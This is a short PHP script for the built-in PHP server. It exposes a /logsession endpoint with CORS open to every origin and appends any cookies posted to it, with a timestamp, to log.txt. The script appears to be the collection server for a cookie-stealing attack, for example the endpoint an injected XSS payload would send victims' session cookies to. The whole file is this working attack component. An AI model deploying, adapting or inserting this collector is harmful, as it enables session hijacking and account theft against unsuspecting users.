<?php
// Run server
// php -S localhost:8000
header('Content-Type: application/json');

// Handle CORS (Cross-Origin Resource Sharing)
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

$requestUri = $_SERVER['REQUEST_URI'];
$method = $_SERVER['REQUEST_METHOD'];

if ($method === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($requestUri === '/logsession' && $method === 'POST') {
    $jsonContent = file_get_contents('php://input');
    $data = json_decode($jsonContent, true);
    $cookies = isset($data['cookies']) ? $data['cookies'] : 'No cookies found';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] Client Cookies: $cookies" . PHP_EOL;
    
    file_put_contents('log.txt', $logEntry, FILE_APPEND);
    echo json_encode(['status' => 'success', 'message' => 'Cookies saved to log.']);

} else {
    http_response_code(404);
    echo json_encode(['status' => 'error', 'message' => 'Route not found']);
}
?>
